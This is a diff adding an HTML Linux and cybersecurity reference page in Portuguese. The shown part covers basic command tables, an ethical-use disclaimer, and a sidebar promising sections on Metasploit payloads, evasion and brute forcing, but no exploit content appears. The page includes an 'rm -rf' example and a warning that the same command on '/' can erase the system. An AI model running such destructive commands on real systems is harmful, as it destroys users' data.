@@ -1,0 +1,3356 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Documentação Completa de Comandos Linux e Ferramentas de Cybersegurança</title>
+  <style>
+    :root {
+      --primary-color: #2b2d42;
+      --secondary-color: #8d99ae;
+      --accent-color: #ef233c;
+      --light-color: #edf2f4;
+      --dark-color: #1a1a2e;
+      --success-color: #2a9d8f;
+      --warning-color: #e9c46a;
+      --danger-color: #e63946;
+      --code-bg: #2b2d42;
+      --code-color: #edf2f4;
+      --cybersec-color: #4a0080;
+    }
+
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      line-height: 1.6;
+      color: var(--dark-color);
+      background-color: var(--light-color);
+      padding-top: 60px;
+    }
+
+    body.dark-mode {
+      --light-color: #121212;
+      --dark-color: #f0f0f0;
+      --code-bg: #1e1e1e;
+      --code-color: #f0f0f0;
+      --secondary-color: #4a4a4a;
+      background-color: var(--light-color);
+      color: var(--dark-color);
+    }
+
+    header {
+      background-color: var(--primary-color);
+      color: #fff;
+      padding: 1rem;
+      position: fixed;
+      top: 0;
+      width: 100%;
+      z-index: 1000;
+      box-shadow: 0 2px 10px rgba(0, 0, 0, 0.2);
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+
+    .logo {
+      font-size: 1.5rem;
+      font-weight: bold;
+    }
+
+    nav ul {
+      display: flex;
+      list-style: none;
+    }
+
+    nav ul li {
+      margin-left: 1rem;
+    }
+
+    nav ul li a {
+      color: var(--light-color);
+      text-decoration: none;
+      transition: color 0.3s;
+    }
+
+    nav ul li a:hover {
+      color: var(--accent-color);
+    }
+
+    .container {
+      width: 90%;
+      max-width: 1200px;
+      margin: 2rem auto;
+      display: grid;
+      grid-template-columns: 250px 1fr;
+      gap: 2rem;
+    }
+
+    .sidebar {
+      background-color: var(--secondary-color);
+      border-radius: 10px;
+      padding: 1.5rem;
+      position: sticky;
+      top: 80px;
+      height: calc(100vh - 100px);
+      overflow-y: auto;
+    }
+
+    .sidebar h3 {
+      color: var(--primary-color);
+      margin-bottom: 1rem;
+      padding-bottom: 0.5rem;
+      border-bottom: 2px solid var(--primary-color);
+    }
+
+    .sidebar ul {
+      list-style: none;
+    }
+
+    .sidebar ul li {
+      margin-bottom: 0.5rem;
+    }
+
+    .sidebar ul li a {
+      color: var(--dark-color);
+      text-decoration: none;
+      display: block;
+      padding: 0.5rem;
+      border-radius: 5px;
+      transition: background-color 0.3s, color 0.3s;
+    }
+
+    .sidebar ul li a:hover,
+    .sidebar ul li a.active {
+      background-color: var(--primary-color);
+      color: var(--light-color);
+    }
+
+    .content {
+      background-color: white;
+      padding: 2rem;
+      border-radius: 10px;
+      box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+    }
+
+    body.dark-mode .content {
+      background-color: #1a1a1a;
+    }
+
+    .section {
+      margin-bottom: 2rem;
+      padding-bottom: 1rem;
+      border-bottom: 1px solid var(--secondary-color);
+    }
+
+    .section:last-child {
+      border-bottom: none;
+    }
+
+    .section.cybersec {
+      border-left: 4px solid var(--cybersec-color);
+      padding-left: 1rem;
+    }
+
+    h1,
+    h2,
+    h3,
+    h4 {
+      color: var(--primary-color);
+      margin-bottom: 1rem;
+    }
+
+    body.dark-mode h1,
+    body.dark-mode h2,
+    body.dark-mode h3,
+    body.dark-mode h4 {
+      color: #f0f0f0;
+    }
+
+    h1 {
+      font-size: 2.5rem;
+      border-bottom: 3px solid var(--accent-color);
+      padding-bottom: 0.5rem;
+      margin-bottom: 1.5rem;
+    }
+
+    h2 {
+      font-size: 2rem;
+      margin-top: 2rem;
+    }
+
+    h3 {
+      font-size: 1.5rem;
+      margin-top: 1.5rem;
+    }
+
+    h4 {
+      font-size: 1.2rem;
+      margin-top: 1rem;
+    }
+
+    p {
+      margin-bottom: 1rem;
+    }
+
+    ul,
+    ol {
+      margin-bottom: 1rem;
+      margin-left: 2rem;
+    }
+
+    code {
+      background-color: var(--code-bg);
+      color: var(--code-color);
+      padding: 0.2rem 0.4rem;
+      border-radius: 3px;
+      font-family: 'Courier New', monospace;
+      font-size: 0.9rem;
+    }
+
+    pre {
+      background-color: var(--code-bg);
+      color: var(--code-color);
+      padding: 1rem;
+      border-radius: 5px;
+      overflow-x: auto;
+      margin-bottom: 1rem;
+      font-family: 'Courier New', monospace;
+    }
+
+    .command {
+      display: flex;
+      background-color: var(--dark-color);
+      color: var(--light-color);
+      border-radius: 5px;
+      margin-bottom: 1rem;
+      overflow: hidden;
+    }
+
+    .command code {
+      flex: 1;
+      padding: 0.7rem;
+      background-color: transparent;
+      color: white;
+    }
+
+    .copy-btn {
+      background-color: var(--primary-color);
+      border: none;
+      color: white;
+      padding: 0.7rem 1rem;
+      cursor: pointer;
+      transition: background-color 0.3s;
+    }
+
+    .copy-btn:hover {
+      background-color: var(--accent-color);
+    }
+
+    .table-container {
+      overflow-x: auto;
+      margin-bottom: 1.5rem;
+    }
+
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      margin-bottom: 1rem;
+    }
+
+    th,
+    td {
+      border: 1px solid var(--secondary-color);
+      padding: 0.75rem;
+      text-align: left;
+    }
+
+    th {
+      background-color: var(--primary-color);
+      color: var(--light-color);
+    }
+
+    tr:nth-child(even) {
+      background-color: rgba(141, 153, 174, 0.1);
+    }
+
+    .card {
+      background-color: white;
+      border-radius: 8px;
+      box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+      padding: 1.5rem;
+      margin-bottom: 1.5rem;
+      transition: transform 0.3s, box-shadow 0.3s;
+    }
+
+    body.dark-mode .card {
+      background-color: #1a1a1a;
+    }
+
+    .card:hover {
+      transform: translateY(-5px);
+      box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+    }
+
+    .card-header {
+      border-bottom: 2px solid var(--secondary-color);
+      padding-bottom: 0.8rem;
+      margin-bottom: 1rem;
+      font-weight: bold;
+      color: var(--primary-color);
+      font-size: 1.2rem;
+    }
+
+    body.dark-mode .card-header {
+      color: #f0f0f0;
+    }
+
+    .comparison-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+      gap: 1.5rem;
+      margin-bottom: 2rem;
+    }
+
+    .info-box {
+      background-color: rgba(141, 153, 174, 0.2);
+      border-left: 4px solid var(--accent-color);
+      padding: 1rem;
+      margin-bottom: 1.5rem;
+      border-radius: 0 5px 5px 0;
+    }
+
+    .info-box.warning {
+      border-left-color: var(--warning-color);
+    }
+
+    .info-box.success {
+      border-left-color: var(--success-color);
+    }
+
+    .info-box.danger {
+      border-left-color: var(--danger-color);
+    }
+
+    .info-box.cybersec {
+      border-left-color: var(--cybersec-color);
+    }
+
+    .info-box-title {
+      font-weight: bold;
+      margin-bottom: 0.5rem;
+      color: var(--primary-color);
+    }
+
+    body.dark-mode .info-box-title {
+      color: #f0f0f0;
+    }
+
+    button {
+      background-color: var(--primary-color);
+      color: white;
+      border: none;
+      padding: 0.6rem 1.2rem;
+      border-radius: 5px;
+      cursor: pointer;
+      transition: background-color 0.3s;
+    }
+
+    button:hover {
+      background-color: var(--accent-color);
+    }
+
+    .tabs {
+      display: flex;
+      margin-bottom: 1rem;
+      border-bottom: 1px solid var(--secondary-color);
+    }
+
+    .tab-btn {
+      background: none;
+      border: none;
+      padding: 0.8rem 1.5rem;
+      cursor: pointer;
+      opacity: 0.6;
+      border-bottom: 3px solid transparent;
+      transition: opacity 0.3s, border-color 0.3s;
+      color: var(--dark-color);
+    }
+
+    body.dark-mode .tab-btn {
+      color: #f0f0f0;
+    }
+
+    .tab-btn.active {
+      opacity: 1;
+      border-bottom-color: var(--accent-color);
+      font-weight: bold;
+    }
+
+    .tab-content {
+      display: none;
+    }
+
+    .tab-content.active {
+      display: block;
+    }
+
+    .search-container {
+      margin-bottom: 1.5rem;
+    }
+
+    #searchInput {
+      width: 100%;
+      padding: 0.8rem;
+      border: 1px solid var(--secondary-color);
+      border-radius: 5px;
+      font-size: 1rem;
+      background-color: white;
+      color: var(--dark-color);
+    }
+
+    body.dark-mode #searchInput {
+      background-color: #333;
+      color: #f0f0f0;
+      border-color: #444;
+    }
+
+    .mobile-menu-btn {
+      display: none;
+      background: none;
+      border: none;
+      font-size: 1.5rem;
+      color: var(--light-color);
+      cursor: pointer;
+    }
+
+    @media (max-width: 768px) {
+      .container {
+        grid-template-columns: 1fr;
+      }
+
+      .sidebar {
+        display: none;
+        position: fixed;
+        top: 60px;
+        left: 0;
+        width: 100%;
+        height: calc(100vh - 60px);
+        z-index: 900;
+        border-radius: 0;
+      }
+
+      .sidebar.active {
+        display: block;
+      }
+
+      .mobile-menu-btn {
+        display: block;
+      }
+
+      header {
+        padding: 0.8rem;
+      }
+
+      .content {
+        padding: 1rem;
+      }
+
+      h1 {
+        font-size: 2rem;
+      }
+
+      h2 {
+        font-size: 1.7rem;
+      }
+
+      .comparison-grid {
+        grid-template-columns: 1fr;
+      }
+    }
+
+    :target {
+      scroll-margin-top: 70px;
+    }
+
+    .back-to-top {
+      position: fixed;
+      bottom: 2rem;
+      right: 2rem;
+      background-color: var(--primary-color);
+      color: white;
+      width: 50px;
+      height: 50px;
+      border-radius: 50%;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      text-decoration: none;
+      box-shadow: 0 2px 10px rgba(0, 0, 0, 0.3);
+      opacity: 0;
+      visibility: hidden;
+      transition: opacity 0.3s, visibility 0.3s;
+    }
+
+    .back-to-top.visible {
+      opacity: 1;
+      visibility: visible;
+    }
+
+    .progress-container {
+      width: 100%;
+      height: 4px;
+      background: transparent;
+      position: fixed;
+      top: 60px;
+      left: 0;
+      z-index: 1001;
+    }
+
+    .progress-bar {
+      height: 4px;
+      background: var(--accent-color);
+      width: 0%;
+    }
+
+    .theme-switch {
+      position: relative;
+      display: inline-block;
+      width: 60px;
+      height: 34px;
+      margin-left: 1rem;
+    }
+
+    .theme-switch input {
+      opacity: 0;
+      width: 0;
+      height: 0;
+    }
+
+    .slider {
+      position: absolute;
+      cursor: pointer;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      background-color: var(--secondary-color);
+      transition: .4s;
+      border-radius: 34px;
+    }
+
+    .slider:before {
+      position: absolute;
+      content: "";
+      height: 26px;
+      width: 26px;
+      left: 4px;
+      bottom: 4px;
+      background-color: white;
+      transition: .4s;
+      border-radius: 50%;
+    }
+
+    input:checked+.slider {
+      background-color: var(--accent-color);
+    }
+
+    input:checked+.slider:before {
+      transform: translateX(26px);
+    }
+
+    .cybersec-icon {
+      color: var(--cybersec-color);
+      margin-right: 5px;
+    }
+
+    .tool-category {
+      display: inline-block;
+      padding: 3px 8px;
+      border-radius: 4px;
+      font-size: 0.8rem;
+      margin-left: 8px;
+      background-color: var(--secondary-color);
+      color: white;
+    }
+
+    .tool-category.recon {
+      background-color: #4285F4;
+    }
+
+    .tool-category.exploit {
+      background-color: #EA4335;
+    }
+
+    .tool-category.crypto {
+      background-color: #34A853;
+    }
+
+    .tool-category.forensics {
+      background-color: #FBBC05;
+    }
+
+    .tool-category.post {
+      background-color: #8338EC;
+    }
+
+    .tool-category.social {
+      background-color: #FF006E;
+    }
+
+    .tool-category.wireless {
+      background-color: #3A86FF;
+    }
+
+    .tool-category.password {
+      background-color: #FB5607;
+    }
+  </style>
+</head>
+
+<body>
+  <!-- Progress Bar -->
+  <div class="progress-container">
+    <div class="progress-bar" id="progressBar"></div>
+  </div>
+
+  <!-- Header -->
+  <header>
+    <div class="logo">Documentação Linux & Cybersegurança</div>
+    <button class="mobile-menu-btn" id="mobileMenuBtn">☰</button>
+    <nav>
+      <ul>
+        <li><a href="#inicio">Início</a></li>
+        <li><a href="#comandos-basicos">Comandos Básicos</a></li>
+        <li><a href="#cybersec-tools">Ferramentas de Segurança</a></li>
+        <li><a href="#scripts">Scripting</a></li>
+        <li>
+          <label class="theme-switch">
+            <input type="checkbox" id="themeToggle">
+            <span class="slider"></span>
+          </label>
+        </li>
+      </ul>
+    </nav>
+  </header>
+
+  <!-- Main Container -->
+  <div class="container">
+    <!-- Sidebar -->
+    <aside class="sidebar">
+      <div class="search-container">
+        <input type="text" id="searchInput" placeholder="Buscar comandos ou ferramentas...">
+      </div>
+      <h3>Comandos Linux</h3>
+      <ul id="tableOfContents">
+        <li><a href="#inicio">Introdução</a></li>
+        <li><a href="#comandos-basicos">Comandos Básicos</a>
+          <ul>
+            <li><a href="#navegacao">Navegação no Sistema</a></li>
+            <li><a href="#manipulacao-arquivos">Manipulação de Arquivos</a></li>
+            <li><a href="#gerenciamento-usuarios">Gerenciamento de Usuários</a></li>
+            <li><a href="#permissoes">Permissões</a></li>
+            <li><a href="#processos">Processos</a></li>
+            <li><a href="#rede">Rede</a></li>
+          </ul>
+        </li>
+        <li><a href="#comandos-avancados">Comandos Avançados</a>
+          <ul>
+            <li><a href="#texto">Processamento de Texto</a></li>
+            <li><a href="#compressao">Compressão</a></li>
+            <li><a href="#agendamento">Agendamento</a></li>
+            <li><a href="#sistema">Informações do Sistema</a></li>
+          </ul>
+        </li>
+        <li><a href="#scripts">Shell Scripting</a>
+          <ul>
+            <li><a href="#bash">Bash Scripting</a></li>
+            <li><a href="#variaveis">Variáveis e Condicionais</a></li>
+            <li><a href="#loops">Loops</a></li>
+            <li><a href="#funcoes">Funções</a></li>
+          </ul>
+        </li>
+        <li><a href="#cybersec-tools">Ferramentas de Cybersegurança</a>
+          <ul>
+            <li><a href="#recon">Reconhecimento</a></li>
+            <li><a href="#scanners">Scanners</a></li>
+            <li><a href="#exploits">Exploits e Frameworks</a></li>
+            <li><a href="#passwords">Cracking de Senhas</a></li>
+            <li><a href="#sniffers">Sniffers</a></li>
+            <li><a href="#forensics">Análise Forense</a></li>
+            <li><a href="#wireless">Segurança Wireless</a></li>
+            <li><a href="#social">Engenharia Social</a></li>
+          </ul>
+        </li>
+        <li><a href="#metasploit">Metasploit Framework</a>
+          <ul>
+            <li><a href="#msfconsole">MSFconsole</a></li>
+            <li><a href="#modules">Módulos</a></li>
+            <li><a href="#payloads">Payloads</a></li>
+            <li><a href="#meterpreter">Meterpreter</a></li>
+          </ul>
+        </li>
+        <li><a href="#nmap">Nmap Avançado</a>
+          <ul>
+            <li><a href="#port-scan">Tipos de Scan</a></li>
+            <li><a href="#scripts-nse">Scripts NSE</a></li>
+            <li><a href="#evasion">Técnicas de Evasão</a></li>
+          </ul>
+        </li>
+        <li><a href="#wireshark">Wireshark</a>
+          <ul>
+            <li><a href="#capture">Capturas</a></li>
+            <li><a href="#filters">Filtros</a></li>
+            <li><a href="#analysis">Análise de Pacotes</a></li>
+          </ul>
+        </li>
+        <li><a href="#hydra">Hydra</a>
+          <ul>
+            <li><a href="#brute-force">Ataques de Força Bruta</a></li>
+            <li><a href="#wordlists">Wordlists</a></li>
+          </ul>
+        </li>
+      </ul>
+    </aside>
+
+    <!-- Main Content -->
+    <main class="content">
+      <section id="inicio" class="section">
+        <h1>Documentação Completa de Comandos Linux e Ferramentas de Cybersegurança</h1>
+        <p>Bem-vindo à documentação abrangente de comandos Linux e ferramentas de cybersegurança. Este recurso cobre
+          desde comandos básicos do sistema Linux até ferramentas avançadas de segurança digital usadas por
+          profissionais de cybersegurança.</p>
+
+        <div class="info-box">
+          <div class="info-box-title">Propósito Educacional</div>
+          <p>Esta documentação foi criada exclusivamente para fins educacionais e de aprendizado ético. As ferramentas e
+            técnicas apresentadas aqui devem ser usadas apenas em ambientes controlados, em seus próprios sistemas ou
+            com autorização explícita. O uso indevido dessas ferramentas pode constituir crime em muitas jurisdições.
+          </p>
+        </div>
+
+        <h3>Sobre o Linux</h3>
+        <p>O Linux é um sistema operacional de código aberto baseado em Unix. É conhecido por sua estabilidade,
+          segurança e flexibilidade. O que distingue o Linux é sua interface de linha de comando (CLI) poderosa, que
+          permite aos usuários executar tarefas complexas com comandos de texto simples.</p>
+
+        <h3>Sobre as Ferramentas de Cybersegurança</h3>
+        <p>Ferramentas de cybersegurança são utilizadas por profissionais para identificar vulnerabilidades, testar a
+          segurança de sistemas e redes, e proteger infraestruturas digitais. Muitas destas ferramentas estão incluídas
+          em distribuições Linux especializadas como o Kali Linux, que é desenvolvido especificamente para testes de
+          penetração e análise de segurança.</p>
+
+        <div class="tabs">
+          <button class="tab-btn active" data-tab="principiantes">Para Principiantes</button>
+          <button class="tab-btn" data-tab="intermediarios">Para Intermediários</button>
+          <button class="tab-btn" data-tab="avancados">Para Avançados</button>
+        </div>
+
+        <div id="principiantes" class="tab-content active">
+          <p>Se você está começando, recomendamos primeiro se familiarizar com:</p>
+          <ul>
+            <li>Comandos básicos de navegação (<code>cd</code>, <code>ls</code>, <code>pwd</code>)</li>
+            <li>Manipulação de arquivos (<code>cp</code>, <code>mv</code>, <code>rm</code>)</li>
+            <li>Visualização de arquivos (<code>cat</code>, <code>less</code>, <code>more</code>)</li>
+            <li>Conceitos básicos de permissões (<code>chmod</code>, <code>chown</code>)</li>
+          </ul>
+          <p>Concentre-se em entender a estrutura do sistema Linux e como navegar pelo terminal antes de avançar para as
+            ferramentas de segurança.</p>
+        </div>
+
+        <div id="intermediarios" class="tab-content">
+          <p>Para usuários com conhecimento básico de Linux, explore:</p>
+          <ul>
+            <li>Manipulação de texto avançada (<code>grep</code>, <code>sed</code>, <code>awk</code>)</li>
+            <li>Gerenciamento de rede (<code>ifconfig</code>/<code>ip</code>, <code>netstat</code>, <code>ssh</code>)
+            </li>
+            <li>Shell scripting básico</li>
+            <li>Ferramentas básicas de reconhecimento (Nmap, Whois)</li>
+            <li>Monitoramento de sistema (<code>top</code>, <code>htop</code>, <code>ps</code>)</li>
+          </ul>
+        </div>
+
+        <div id="avancados" class="tab-content">
+          <p>Para usuários avançados e profissionais de segurança:</p>
+          <ul>
+            <li>Ferramentas complexas como Metasploit, Wireshark e Burp Suite</li>
+            <li>Scripting avançado para automação de tarefas de segurança</li>
+            <li>Técnicas de evasão e ofuscação</li>
+            <li>Análise forense digital</li>
+            <li>Engenharia reversa de malware</li>
+            <li>Testes de penetração completos</li>
+          </ul>
+        </div>
+      </section>
+
+      <section id="comandos-basicos" class="section">
+        <h2>Comandos Básicos do Linux</h2>
+        <p>Os comandos básicos são fundamentais para navegar e operar no ambiente Linux. Eles permitem realizar tarefas
+          essenciais como gerenciar arquivos, usuários, e monitorar o sistema.</p>
+
+        <h3 id="navegacao">Navegação no Sistema</h3>
+        <div class="table-container">
+          <table>
+            <thead>
+              <tr>
+                <th>Comando</th>
+                <th>Descrição</th>
+                <th>Exemplo</th>
+              </tr>
+            </thead>
+            <tbody>
+              <tr>
+                <td><code>pwd</code></td>
+                <td>Exibe o diretório de trabalho atual (Print Working Directory)</td>
+                <td><code>pwd</code></td>
+              </tr>
+              <tr>
+                <td><code>ls</code></td>
+                <td>Lista o conteúdo de um diretório</td>
+                <td><code>ls -la</code> (lista detalhada incluindo arquivos ocultos)</td>
+              </tr>
+              <tr>
+                <td><code>cd</code></td>
+                <td>Muda de diretório (Change Directory)</td>
+                <td><code>cd /etc</code> (vai para o diretório /etc)</td>
+              </tr>
+              <tr>
+                <td><code>find</code></td>
+                <td>Procura por arquivos e diretórios</td>
+                <td><code>find /home -name "*.txt"</code> (encontra arquivos .txt)</td>
+              </tr>
+              <tr>
+                <td><code>locate</code></td>
+                <td>Encontra arquivos rapidamente usando um banco de dados indexado</td>
+                <td><code>locate documento.pdf</code></td>
+              </tr>
+              <tr>
+                <td><code>which</code></td>
+                <td>Mostra o caminho completo de um comando</td>
+                <td><code>which python</code></td>
+              </tr>
+              <tr>
+                <td><code>whereis</code></td>
+                <td>Localiza arquivos binários, fonte e manual de um comando</td>
+                <td><code>whereis bash</code></td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+
+        <p>Opções comuns para o comando <code>ls</code>:</p>
+        <div class="command">
+          <code>ls -l    # Formato longo</code>
+          <button class="copy-btn" data-command="ls -l">Copiar</button>
+        </div>
+        <div class="command">
+          <code>ls -a    # Mostra arquivos ocultos</code>
+          <button class="copy-btn" data-command="ls -a">Copiar</button>
+        </div>
+        <div class="command">
+          <code>ls -h    # Tamanhos legíveis para humanos</code>
+          <button class="copy-btn" data-command="ls -h">Copiar</button>
+        </div>
+        <div class="command">
+          <code>ls -R    # Lista recursivamente diretórios</code>
+          <button class="copy-btn" data-command="ls -R">Copiar</button>
+        </div>
+
+        <h3 id="manipulacao-arquivos">Manipulação de Arquivos</h3>
+        <div class="table-container">
+          <table>
+            <thead>
+              <tr>
+                <th>Comando</th>
+                <th>Descrição</th>
+                <th>Exemplo</th>
+              </tr>
+            </thead>
+            <tbody>
+              <tr>
+                <td><code>touch</code></td>
+                <td>Cria um arquivo vazio ou atualiza a data de modificação</td>
+                <td><code>touch arquivo.txt</code></td>
+              </tr>
+              <tr>
+                <td><code>cp</code></td>
+                <td>Copia arquivos e diretórios</td>
+                <td><code>cp arquivo.txt /backup/</code></td>
+              </tr>
+              <tr>
+                <td><code>mv</code></td>
+                <td>Move ou renomeia arquivos e diretórios</td>
+                <td><code>mv arquivo.txt novo-nome.txt</code></td>
+              </tr>
+              <tr>
+                <td><code>rm</code></td>
+                <td>Remove arquivos ou diretórios</td>
+                <td><code>rm -rf diretorio/</code> (remove recursivamente)</td>
+              </tr>
+              <tr>
+                <td><code>mkdir</code></td>
+                <td>Cria diretórios</td>
+                <td><code>mkdir -p dir1/dir2/dir3</code> (cria estrutura aninhada)</td>
+              </tr>
+              <tr>
+                <td><code>rmdir</code></td>
+                <td>Remove diretórios vazios</td>
+                <td><code>rmdir diretorio</code></td>
+              </tr>
+              <tr>
+                <td><code>cat</code></td>
+                <td>Exibe o conteúdo de arquivos</td>
+                <td><code>cat arquivo.txt</code></td>
+              </tr>
+              <tr>
+                <td><code>less</code></td>
+                <td>Visualiza arquivos com paginação</td>
+                <td><code>less arquivo.txt</code></td>
+              </tr>
+              <tr>
+                <td><code>head</code></td>
+                <td>Exibe as primeiras linhas de um arquivo</td>
+                <td><code>head -n 20 arquivo.txt</code> (primeiras 20 linhas)</td>
+              </tr>
+              <tr>
+                <td><code>tail</code></td>
+                <td>Exibe as últimas linhas de um arquivo</td>
+                <td><code>tail -f /var/log/syslog</code> (segue em tempo real)</td>
+              </tr>
+              <tr>
+                <td><code>nano</code></td>
+                <td>Editor de texto simples</td>
+                <td><code>nano arquivo.txt</code></td>
+              </tr>
+              <tr>
+                <td><code>vim</code></td>
+                <td>Editor de texto avançado</td>
+                <td><code>vim arquivo.txt</code></td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+
+        <div class="info-box warning">
+          <div class="info-box-title">Cuidado</div>
+          <p>O comando <code>rm -rf</code> sem argumentos específicos ou com <code>/</code> pode excluir todo o sistema!
+            Sempre verifique duas vezes antes de executar comandos de remoção.</p>
+        </div>
+
+        <h3 id="gerenciamento-usuarios">Gerenciamento de Usuários</h3>
+        <div class="table-container">
+          <table>
+            <thead>
+              <tr>
+                <th>Comando</th>
+                <th>Descrição</th>
+                <th>Exemplo</th>
+              </tr>
+            </thead>
+            <tbody>
+              <tr>
+                <td><code>useradd</code></td>
+                <td>Cria um novo usuário</td>
+                <td><code>sudo useradd -m -s /bin/bash joao</code></td>
+              </tr>
+              <tr>
+                <td><code>usermod</code></td>
+                <td>Modifica um usuário existente</td>
+                <td><code>sudo usermod -aG sudo joao</code> (adiciona ao grupo sudo)</td>
+              </tr>
+              <tr>
+                <td><code>userdel</code></td>
+                <td>Remove um usuário</td>
+                <td><code>sudo userdel -r joao</code> (inclui diretório home)</td>
+              </tr>
+              <tr>
+                <td><code>passwd</code></td>
+                <td>Altera senha de usuário</td>
+                <td><code>sudo passwd joao</code></td>
+              </tr>
+              <tr>
+                <td><code>groupadd</code></td>
+                <td>Cria um novo grupo</td>
+                <td><code>sudo groupadd desenvolvedores</code></td>
+              </tr>
+              <tr>
+                <td><code>groupdel</code></td>
+                <td>Remove um grupo</td>
+                <td><code>sudo groupdel desenvolvedores</code></td>
+              </tr>
+              <tr>
+                <td><code>id</code></td>
+                <td>Exibe informações de ID de usuário e grupo</td>
+                <td><code>id joao</code></td>
+              </tr>
+              <tr>
+                <td><code>who</code></td>
+                <td>Mostra quem está logado</td>
+                <td><code>who</code></td>
+              </tr>
+              <tr>
+                <td><code>whoami</code></td>
+                <td>Exibe o nome do usuário atual</td>
+                <td><code>whoami</code></td>
+              </tr>
+              <tr>
+                <td><code>su</code></td>
+                <td>Muda para outro usuário</td>
+                <td><code>su - joao</code></td>
+              </tr>
+              <tr>
+                <td><code>sudo</code></td>
+                <td>Executa um comando como outro usuário (geralmente root)</td>
+                <td><code>sudo apt update</code></td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+
+        <h3 id="permissoes">Permissões</h3>
+        <p>No Linux, as permissões de arquivos são baseadas em três grupos: proprietário (owner), grupo (group) e outros
+          (others). Cada grupo tem três tipos de permissões: leitura (r), escrita (w) e execução (x).</p>
+
+        <div class="command">
+          <code>chmod 755 arquivo.sh    # Define permissões (rwxr-xr-x)</code>
+          <button class="copy-btn" data-command="chmod 755 arquivo.sh">Copiar</button>
+        </div>
+
+        <div class="command">
+          <code>chown usuario:grupo arquivo.txt    # Altera proprietário e grupo</code>
+          <button class="copy-btn" data-command="chown usuario:grupo arquivo.txt">Copiar</button>
+        </div>
+
+        <div class="info-box">
+          <div class="info-box-title">Notação Numérica de Permissões</div>
+          <p>As permissões no Linux podem ser representadas por números:</p>
+          <ul>
+            <li><code>4</code>: Permissão de leitura (r)</li>
+            <li><code>2</code>: Permissão de escrita (w)</li>
+            <li><code>1</code>: Permissão de execução (x)</li>
+          </ul>
+          <p>Combinando esses valores, criamos as permissões para cada grupo:</p>
+          <ul>
+            <li><code>chmod 755</code> = rwxr-xr-x (proprietário: tudo; grupo e outros: ler e executar)</li>
+            <li><code>chmod 644</code> = rw-r--r-- (proprietário: ler e escrever; grupo e outros: apenas ler)</li>
+            <li><code>chmod 777</code> = rwxrwxrwx (todos podem ler, escrever e executar - geralmente inseguro)</li>
+          </ul>
+        </div>
+
+        <h3 id="processos">Gerenciamento de Processos</h3>
+        <div class="table-container">
+          <table>
+            <thead>
+              <tr>
+                <th>Comando</th>
+                <th>Descrição</th>
+                <th>Exemplo</th>
+              </tr>
+            </thead>
+            <tbody>
+              <tr>
+                <td><code>ps</code></td>
+                <td>Lista processos em execução</td>
+                <td><code>ps aux</code> (todos os processos detalhados)</td>
+              </tr>
+              <tr>
+                <td><code>top</code></td>
+                <td>Exibe processos em execução em tempo real</td>
+                <td><code>top</code></td>
+              </tr>
+              <tr>
+                <td><code>htop</code></td>
+                <td>Versão melhorada do top, mais interativa</td>
+                <td><code>htop</code></td>
+              </tr>
+              <tr>
+                <td><code>kill</code></td>
+                <td>Encerra um processo pelo PID</td>
+                <td><code>kill -9 1234</code> (força encerramento do processo 1234)</td>
+              </tr>
+              <tr>
+                <td><code>pkill</code></td>
+                <td>Encerra processos pelo nome</td>
+                <td><code>pkill firefox</code></td>
+              </tr>
+              <tr>
+                <td><code>killall</code></td>
+                <td>Encerra todos os processos pelo nome</td>
+                <td><code>killall chrome</code></td>
+              </tr>
+              <tr>
+                <td><code>nice</code></td>
+                <td>Executa um programa com prioridade modificada</td>
+                <td><code>nice -n 10 comando</code> (menor prioridade)</td>
+              </tr>
+              <tr>
+                <td><code>renice</code></td>
+                <td>Altera a prioridade de um processo em execução</td>
+                <td><code>renice -n 10 -p 1234</code></td>
+              </tr>
+              <tr>
+                <td><code>bg</code></td>
+                <td>Continua um processo em segundo plano</td>
+                <td><code>bg %1</code></td>
+              </tr>
+              <tr>
+                <td><code>fg</code></td>
+                <td>Traz um processo para primeiro plano</td>
+                <td><code>fg %1</code></td>
+              </tr>
+              <tr>
+                <td><code>jobs</code></td>
+                <td>Lista trabalhos em segundo plano</td>
+                <td><code>jobs</code></td>
+              </tr>
+              <tr>
+                <td><code>nohup</code></td>
+                <td>Executa um comando imune ao hangup</td>
+                <td><code>nohup comando &</code></td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+
+        <h3 id="rede">Comandos de Rede</h3>
+        <div class="table-container">
+          <table>
+            <thead>
+              <tr>
+                <th>Comando</th>
+                <th>Descrição</th>
+                <th>Exemplo</th>
+              </tr>
+            </thead>
+            <tbody>
+              <tr>
+                <td><code>ifconfig</code></td>
+                <td>Configura ou mostra interfaces de rede (depreciado)</td>
+                <td><code>ifconfig eth0</code></td>
+              </tr>
+              <tr>
+                <td><code>ip</code></td>
+                <td>Ferramenta moderna para configurar interfaces de rede</td>
+                <td><code>ip addr show</code></td>
+              </tr>
+              <tr>
+                <td><code>ping</code></td>
+                <td>Testa a conectividade com hosts</td>
+                <td><code>ping -c 4 google.com</code></td>
+              </tr>
+              <tr>
+                <td><code>traceroute</code></td>
+                <td>Mostra a rota dos pacotes até o destino</td>
+                <td><code>traceroute google.com</code></td>
+              </tr>
+              <tr>
+                <td><code>netstat</code></td>
+                <td>Exibe conexões de rede, tabelas de roteamento, etc.</td>
+                <td><code>netstat -tuln</code></td>
+              </tr>
+              <tr>
+                <td><code>ss</code></td>
+                <td>Substituto moderno do netstat</td>
+                <td><code>ss -tuln</code></td>
+              </tr>
+              <tr>
+                <td><code>dig</code></td>
+                <td>Consulta DNS</td>
+                <td><code>dig example.com</code></td>
+              </tr>
+              <tr>
+                <td><code>host</code></td>
+                <td>Consulta DNS simplificada</td>
+                <td><code>host example.com</code></td>
+              </tr>
+              <tr>
+                <td><code>nslookup</code></td>
+                <td>Consulta interativa de DNS</td>
+                <td><code>nslookup example.com</code></td>
+              </tr>
